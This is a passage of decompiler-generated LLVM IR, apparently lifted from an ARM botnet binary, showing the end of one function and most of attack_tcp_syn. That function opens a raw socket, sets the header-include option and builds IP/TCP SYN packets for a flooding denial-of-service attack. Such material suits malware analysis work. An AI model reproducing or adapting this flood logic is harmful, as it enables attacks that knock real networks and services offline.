  %v2_af20 = inttoptr i32 %v1_af18 to i16*
  %v3_af20 = call i32 @rand_str(i16* %v2_af20, i32 %v6_aa14)
  store i32 %v3_af20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ada0

dec_label_pc_af28:                                ; preds = %dec_label_pc_aa74
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v1_af2c = call i32 @__GI___libc_close(i32 %v3_aa64)
  store i32 %v1_af2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %entry, %dec_label_pc_af28
  %v1_af38 = phi i32 [ %v3_aa64, %entry ], [ %v1_af2c, %dec_label_pc_af28 ]
  store i32 %v18_a864, i32* %sb.global-to-local, align 4
  store i32 %v24_a864, i32* %fp.global-to-local, align 4
  store i32 %v27_a864, i32* %lr.global-to-local, align 4
  ret i32 %v1_af38

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aa9c
  store i32 %v6_aa14, i32* %r0.global-to-local, align 4
  %v1_af44 = add i32 %v6_aa14, 20
  store i32 %v1_af44, i32* @sb, align 4
  %v3_af48 = mul i32 %v6_aa14, 65536
  store i32 %v3_af48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acf8

; uselistorder directives
  uselistorder i32 %v0_aedc, { 1, 0 }
  uselistorder i32 %v0_aec8, { 1, 0 }
  uselistorder i32 %v0_aeb4, { 1, 0 }
  uselistorder i32 %v5_ae88, { 1, 0 }
  uselistorder i32 %v3_ae38, { 2, 1, 3, 0 }
  uselistorder i32 %v1_ae14, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ade0, { 1, 0 }
  uselistorder i32 %v4_add0, { 1, 0 }
  uselistorder i1 %v7_ad48, { 2, 1, 0 }
  uselistorder i1 %v2_af0c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_aea8, { 2, 3, 1, 0 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_acb0, { 1, 0 }
  uselistorder i32 %v1_ab64, { 1, 2, 0 }
  uselistorder i32 %v1_ab60, { 2, 1, 0 }
  uselistorder i32 %v1_ab5c, { 2, 0, 1 }
  uselistorder i32 %v1_ab58, { 2, 0, 1 }
  uselistorder i32 %v1_ab54, { 2, 0, 1 }
  uselistorder i32 %v1_ab2c, { 1, 0 }
  uselistorder i32 %v3_aad4, { 1, 0 }
  uselistorder i32 %v3_aaac, { 1, 2, 0, 3 }
  uselistorder i32 %v0_aaa4, { 1, 0, 2 }
  uselistorder i32 %v0_aaa0, { 1, 0, 2 }
  uselistorder i32 %v0_aa9c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa94, { 1, 0 }
  uselistorder i1 %v7_aa68, { 1, 0 }
  uselistorder i32 %v3_aa64, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa50, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_aa3c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_aa14, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_a96c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a950, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a900, { 1, 2, 0 }
  uselistorder i32 %v5_a8f4, { 0, 2, 1 }
  uselistorder i32 %v5_a8bc, { 0, 2, 1 }
  uselistorder i32 %v2_a880, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 24, 23, 25, 26, 27, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
  uselistorder label %dec_label_pc_ad0c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af5c = load i32, i32* @r4, align 4
  %v24_af5c = load i32, i32* @fp, align 4
  %v27_af5c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af78 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_af7c = load i32, i32* @r5, align 4
  store i32 %v0_af7c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af78, i32* @sb, align 4
  %v0_af8c = load i32, i32* @r4, align 4
  store i32 %v0_af8c, i32* %r0.global-to-local, align 4
  %v5_af90 = inttoptr i32 %v0_af7c to i32*
  %v6_af90 = call i32 @attack_get_opt_int(i32 %v0_af8c, i32* %v5_af90, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r1.global-to-local, align 4
  %v0_afac = load i32, i32* @r4, align 4
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v5_afb0 = trunc i32 %v6_af90 to i8
  %v6_afb4 = inttoptr i32 %v0_afa8 to i32*
  %v7_afb4 = call i32 @attack_get_opt_int(i32 %v0_afac, i32* %v6_afb4, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_af90)
  %v0_afb8 = load i32, i32* @r5, align 4
  store i32 %v0_afb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afcc = inttoptr i32 %v0_afb8 to i32*
  %v6_afcc = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afcc, i32 4, i32 64, i32 %v7_afb4)
  %v1_afd4 = urem i32 %v6_afcc, 256
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  store i32 %v0_afe4, i32* %r0.global-to-local, align 4
  %v6_afec = inttoptr i32 %v0_afd8 to i32*
  %v7_afec = call i32 @attack_get_opt_int(i32 %v0_afe4, i32* %v6_afec, i32 5, i32 1, i32 %v1_afd4)
  %v1_aff8 = urem i32 %v7_afec, 256
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b004 = load i32, i32* @r5, align 4
  store i32 %v0_b004, i32* %r1.global-to-local, align 4
  %v0_b008 = load i32, i32* @r4, align 4
  store i32 %v0_b008, i32* %r0.global-to-local, align 4
  %v5_b010 = inttoptr i32 %v0_b004 to i32*
  %v6_b010 = call i32 @attack_get_opt_int(i32 %v0_b008, i32* %v5_b010, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_aff8)
  %v0_b018 = load i32, i32* @r5, align 4
  store i32 %v0_b018, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b010, i32* %fp.global-to-local, align 4
  %v0_b028 = load i32, i32* @r4, align 4
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v5_b02c = inttoptr i32 %v0_b018 to i32*
  %v6_b02c = call i32 @attack_get_opt_int(i32 %v0_b028, i32* %v5_b02c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_b034 = load i32, i32* @r5, align 4
  store i32 %v0_b034, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_b02c, i32* @r6, align 4
  %v0_b044 = load i32, i32* @r4, align 4
  store i32 %v0_b044, i32* %r0.global-to-local, align 4
  %v5_b048 = inttoptr i32 %v0_b034 to i32*
  %v6_b048 = call i32 @attack_get_opt_int(i32 %v0_b044, i32* %v5_b048, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_b04c = load i32, i32* @r5, align 4
  store i32 %v0_b04c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b05c = load i32, i32* @r4, align 4
  store i32 %v0_b05c, i32* %r0.global-to-local, align 4
  %v5_b060 = inttoptr i32 %v0_b04c to i32*
  %v6_b060 = call i32 @attack_get_opt_int(i32 %v0_b05c, i32* %v5_b060, i32 18, i32 0, i32 %v6_b048)
  %v0_b064 = load i32, i32* @r5, align 4
  store i32 %v0_b064, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b074 = load i32, i32* @r4, align 4
  store i32 %v0_b074, i32* %r0.global-to-local, align 4
  %v5_b078 = inttoptr i32 %v0_b064 to i32*
  %v6_b078 = call i32 @attack_get_opt_int(i32 %v0_b074, i32* %v5_b078, i32 11, i32 0, i32 %v6_b060)
  %v0_b07c = load i32, i32* @r5, align 4
  store i32 %v0_b07c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b08c = load i32, i32* @r4, align 4
  store i32 %v0_b08c, i32* %r0.global-to-local, align 4
  %v5_b090 = inttoptr i32 %v0_b07c to i32*
  %v6_b090 = call i32 @attack_get_opt_int(i32 %v0_b08c, i32* %v5_b090, i32 12, i32 0, i32 %v6_b078)
  %v0_b094 = load i32, i32* @r5, align 4
  store i32 %v0_b094, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i32, i32* @r4, align 4
  store i32 %v0_b0a4, i32* %r0.global-to-local, align 4
  %v5_b0a8 = inttoptr i32 %v0_b094 to i32*
  %v6_b0a8 = call i32 @attack_get_opt_int(i32 %v0_b0a4, i32* %v5_b0a8, i32 13, i32 0, i32 %v6_b090)
  %v0_b0ac = load i32, i32* @r5, align 4
  store i32 %v0_b0ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c0 = inttoptr i32 %v0_b0ac to i32*
  %v6_b0c0 = call i32 @attack_get_opt_int(i32 %v0_b0bc, i32* %v5_b0c0, i32 14, i32 0, i32 %v6_b0a8)
  %v0_b0c4 = load i32, i32* @r5, align 4
  store i32 %v0_b0c4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b0d4 = load i32, i32* @r4, align 4
  store i32 %v0_b0d4, i32* %r0.global-to-local, align 4
  %v5_b0d8 = inttoptr i32 %v0_b0c4 to i32*
  %v6_b0d8 = call i32 @attack_get_opt_int(i32 %v0_b0d4, i32* %v5_b0d8, i32 15, i32 1, i32 %v6_b0c0)
  %v0_b0dc = load i32, i32* @r5, align 4
  store i32 %v0_b0dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r4, align 4
  store i32 %v0_b0ec, i32* %r0.global-to-local, align 4
  %v5_b0f0 = inttoptr i32 %v0_b0dc to i32*
  %v6_b0f0 = call i32 @attack_get_opt_int(i32 %v0_b0ec, i32* %v5_b0f0, i32 16, i32 0, i32 %v6_b0d8)
  %v2_b0fc = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v0_b100 = load i32, i32* @r5, align 4
  store i32 %v0_b100, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  store i32 %v0_b108, i32* %r0.global-to-local, align 4
  %v5_b10c = inttoptr i32 %v0_b100 to i32*
  %v6_b10c = call i32 @attack_get_opt_ip(i32 %v0_b108, i32* %v5_b10c, i32 25, i32 %v2_b0fc, i32 %v6_b0f0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b120 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v7_b124 = icmp eq i32 %v3_b120, -1
  store i1 %v7_b124, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b120, i32* @sl, align 4
  br i1 %v7_b124, label %dec_label_pc_b5f8, label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b138 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b138, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b14c = call i32 @__GI_setsockopt(i32 %v3_b120, i32 0, i32 3, i32 %v6_b138, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b14c, i32* %r0.global-to-local, align 4
  %v7_b150 = icmp eq i32 %v5_b14c, -1
  store i1 %v7_b150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b150, label %dec_label_pc_b5f0, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b130
  %v3_b160 = mul i32 %v7_afb4, 65536
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v0_b164 = load i32, i32* %fp.global-to-local, align 4
  %v3_b164 = mul i32 %v0_b164, 65536
  store i32 %v3_b164, i32* %r4.global-to-local, align 4
  %v0_b168 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b078, i32* %r2.global-to-local, align 4
  %v3_b174 = urem i32 %v7_afb4, 65536
  store i32 %v3_b174, i32* %r3.global-to-local, align 4
  %v3_b178 = urem i32 %v0_b164, 65536
  %v3_b17c = urem i32 %v0_b168, 65536
  store i32 %v3_b17c, i32* %r1.global-to-local, align 4
  %v0_b180 = load i32, i32* @r7, align 4
  %v2_b180 = icmp eq i32 %v0_b180, 0
  store i1 %v2_b180, i1* %cpsr_z.global-to-local, align 1
  %v1_b190 = urem i32 %v6_b078, 256
  store i32 %v1_b190, i32* @fp, align 4
  br i1 %v2_b180, label %dec_label_pc_b3e4.preheader, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b158
  %tmp52 = mul i32 %v6_b048, 256
  %v3_b1b0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_afb4, 256
  %v3_b1b4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v6_b048, 256
  %v4_b1bc = urem i32 %tmp54, 256
  %v5_b1bc = or i32 %v4_b1bc, %v3_b1b0
  store i32 %v5_b1bc, i32* @lr, align 4
  %v1_b1b8 = mul i32 %v7_afb4, 256
  %v4_b1c0 = and i32 %v1_b1b8, 65280
  %v5_b1c0 = or i32 %v4_b1c0, %v3_b1b4
  %tmp55 = mul i32 %v0_b164, 256
  %v3_b1cc = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b168, 256
  %v3_b1d0 = and i32 %tmp56, 65280
  %v1_b1d4 = urem i32 %v6_b078, 2
  %v1_b1d8 = urem i32 %v6_b090, 2
  %tmp57 = udiv i32 %v0_b164, 256
  %v4_b1dc = urem i32 %tmp57, 256
  %v5_b1dc = or i32 %v4_b1dc, %v3_b1cc
  store i32 %v5_b1dc, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b168, 256
  %v4_b1e0 = urem i32 %tmp58, 256
  %v5_b1e0 = or i32 %v4_b1e0, %v3_b1d0
  store i32 %v5_b1e0, i32* @r5, align 4
  %v1_b1fc = urem i32 %v6_b0a8, 2
  store i32 %v1_b1fc, i32* %r2.global-to-local, align 4
  %v1_b200 = urem i32 %v6_b0c0, 2
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v1_b204 = urem i32 %v6_b0d8, 2
  store i32 %v1_b204, i32* %r0.global-to-local, align 4
  %v1_b208 = urem i32 %v6_b0f0, 2
  store i32 %v1_b208, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b1c0, 65536
  %v4_b290 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b1d8
  %v4_b2f4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1fc
  %v4_b308 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b200
  %v4_b320 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b204
  %v3_b334 = and i32 %tmp64, 2
  %v1_b284 = trunc i32 %v6_afcc to i8
  br label %dec_label_pc_b228

dec_label_pc_b228:                                ; preds = %bb61, %dec_label_pc_b198
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b230 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_b230, i32* %r0.global-to-local, align 4
  %v3_b234 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b234, i32* %r2.global-to-local, align 4
  %v1_b238 = load i32, i32* @sb, align 4
  %v2_b238 = load i32, i32* @r4, align 4
  %v5_b238 = mul i32 %v2_b238, 4
  %v6_b238 = add i32 %v5_b238, %v1_b238
  %v7_b238 = inttoptr i32 %v6_b238 to i32*
  store i32 %v2_b230, i32* %v7_b238, align 4
  %v0_b23c = load i32, i32* %r2.global-to-local, align 4
  %v3_b23c = mul i32 %v0_b23c, 32
  store i32 %v3_b23c, i32* %r3.global-to-local, align 4
  %v0_b240 = load i32, i32* @sb, align 4
  %v4_b240 = mul i32 %v0_b23c, 4
  %v5_b240 = add i32 %v0_b240, %v4_b240
  %v6_b240 = inttoptr i32 %v5_b240 to i32*
  %v7_b240 = load i32, i32* %v6_b240, align 4
  store i32 %v7_b240, i32* %r4.global-to-local, align 4
  %v5_b244 = mul i32 %v0_b23c, 24
  store i32 %v5_b244, i32* %r3.global-to-local, align 4
  %v1_b248 = load i32, i32* @r8, align 4
  %v2_b248 = add i32 %v1_b248, %v5_b244
  store i32 %v2_b248, i32* %r0.global-to-local, align 4
  %v1_b24c = inttoptr i32 %v7_b240 to i8*
  %v2_b24c = load i8, i8* %v1_b24c, align 1
  %tmp65 = urem i8 %v2_b24c, 16
  %v1_b250 = zext i8 %tmp65 to i32
  %v1_b254 = or i32 %v1_b250, 64
  store i32 %v1_b254, i32* %r3.global-to-local, align 4
  %v1_b258 = trunc i32 %v1_b254 to i8
  store i8 %v1_b258, i8* %v1_b24c, align 1
  %v0_b25c = load i32, i32* %r4.global-to-local, align 4
  %v1_b25c = inttoptr i32 %v0_b25c to i8*
  %v2_b25c = load i8, i8* %v1_b25c, align 1
  %v1_b260 = and i8 %v2_b25c, -16
  %v1_b264 = or i8 %v1_b260, 5
  store i32 %v1_aff8, i32* %r3.global-to-local, align 4
  store i8 %v1_b264, i8* %v1_b25c, align 1
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 1
  %v4_b274 = inttoptr i32 %v3_b274 to i8*
  store i8 %v5_afb0, i8* %v4_b274, align 1
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v0_b27c = load i32, i32* %r3.global-to-local, align 4
  %v2_b27c = icmp eq i32 %v0_b27c, 0
  store i1 %v2_b27c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b284 = load i32, i32* %r4.global-to-local, align 4
  %v3_b284 = add i32 %v2_b284, 8
  %v4_b284 = inttoptr i32 %v3_b284 to i8*
  store i8 %v1_b284, i8* %v4_b284, align 1
  %v0_b288 = load i32, i32* %r3.global-to-local, align 4
  %v1_b288 = trunc i32 %v0_b288 to i16
  %v2_b288 = load i32, i32* %r4.global-to-local, align 4
  %v3_b288 = add i32 %v2_b288, 2
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 %v1_b288, i16* %v4_b288, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b290, i32* %r1.global-to-local, align 4
  %v0_b294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b294, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b228
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b228, %bb
  %v2_b298 = load i32, i32* %r4.global-to-local, align 4
  %v3_b298 = add i32 %v2_b298, 9
  %v4_b298 = inttoptr i32 %v3_b298 to i8*
  store i8 6, i8* %v4_b298, align 1
  %v0_b29c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b29c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b29c = load i32, i32* %r2.global-to-local, align 4
  %v2_b29c = trunc i32 %v1_b29c to i16
  %v3_b29c = load i32, i32* %r4.global-to-local, align 4
  %v4_b29c = add i32 %v3_b29c, 6
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v2_b29c, i16* %v5_b29c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b10c, i32* %r2.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 12
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v6_b10c, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 16
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i32*
  %v3_b2a8 = load i32, i32* %v2_b2a8, align 4
  store i32 %v3_b2a8, i32* %r3.global-to-local, align 4
  %v0_b2ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b2ac = trunc i32 %v0_b2ac to i16
  %v2_b2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b2ac = add i32 %v2_b2ac, 4
  %v4_b2ac = inttoptr i32 %v3_b2ac to i16*
  store i16 %v1_b2ac, i16* %v4_b2ac, align 2
  %v0_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2b0 = add i32 %v1_b2b0, 16
  %v3_b2b0 = inttoptr i32 %v2_b2b0 to i32*
  store i32 %v0_b2b0, i32* %v3_b2b0, align 4
  %v0_b2b4 = load i32, i32* @r6, align 4
  %v1_b2b4 = trunc i32 %v0_b2b4 to i16
  %v2_b2b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b2b4 = add i32 %v2_b2b4, 20
  %v4_b2b4 = inttoptr i32 %v3_b2b4 to i16*
  store i16 %v1_b2b4, i16* %v4_b2b4, align 2
  %v0_b2b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_b2b8 = add i32 %v0_b2b8, 20
  store i32 %v1_b2b8, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2b8, 32
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v4_b2bc, i32* %r3.global-to-local, align 4
  %v1_b2c0 = add i32 %v0_b2b8, 33
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i8*
  %v3_b2c0 = load i8, i8* %v2_b2c0, align 1
  %v4_b2c0 = zext i8 %v3_b2c0 to i32
  store i32 %v1_b1d4, i32* %r0.global-to-local, align 4
  %v1_b2c8 = urem i8 %v3_b2bc, 16
  %v1_b2cc = or i8 %v1_b2c8, -96
  %v1_b2d0 = and i32 %v4_b2c0, 223
  store i32 %v1_b2d0, i32* %r2.global-to-local, align 4
  store i8 %v1_b2cc, i8* %v2_b2bc, align 1
  %v0_b2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_b2d8 = mul i32 %v1_b2d8, 32
  %v5_b2d8 = or i32 %v4_b2d8, %v0_b2d8
  store i32 %v5_b2d8, i32* %r2.global-to-local, align 4
  store i32 %v5_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = trunc i32 %v5_b2d8 to i8
  %v2_b2e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2e0 = add i32 %v2_b2e0, 13
  %v4_b2e0 = inttoptr i32 %v3_b2e0 to i8*
  store i8 %v1_b2e0, i8* %v4_b2e0, align 1
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2e4 = add i32 %v1_b2e4, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v0_b2e4, i32* %v3_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1d8, i32* %r0.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 239
  %v5_b2f4 = or i32 %v1_b2f0, %v4_b2f4
  store i32 %v5_b2f4, i32* %r3.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v5_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1fc, i32* %r3.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 247
  %v5_b308 = or i32 %v1_b304, %v4_b308
  store i32 %v5_b308, i32* %r2.global-to-local, align 4
  %v0_b30c = load i32, i32* @r5, align 4
  %v1_b30c = trunc i32 %v0_b30c to i16
  %v3_b30c = add i32 %v0_b2fc, 2
  %v4_b30c = inttoptr i32 %v3_b30c to i16*
  store i16 %v1_b30c, i16* %v4_b30c, align 2
  %v0_b310 = load i32, i32* %r2.global-to-local, align 4
  %v1_b310 = trunc i32 %v0_b310 to i8
  %v2_b310 = load i32, i32* %r1.global-to-local, align 4
  %v3_b310 = add i32 %v2_b310, 13
  %v4_b310 = inttoptr i32 %v3_b310 to i8*
  store i8 %v1_b310, i8* %v4_b310, align 1
  %v0_b314 = load i32, i32* %r1.global-to-local, align 4
  %v1_b314 = add i32 %v0_b314, 13
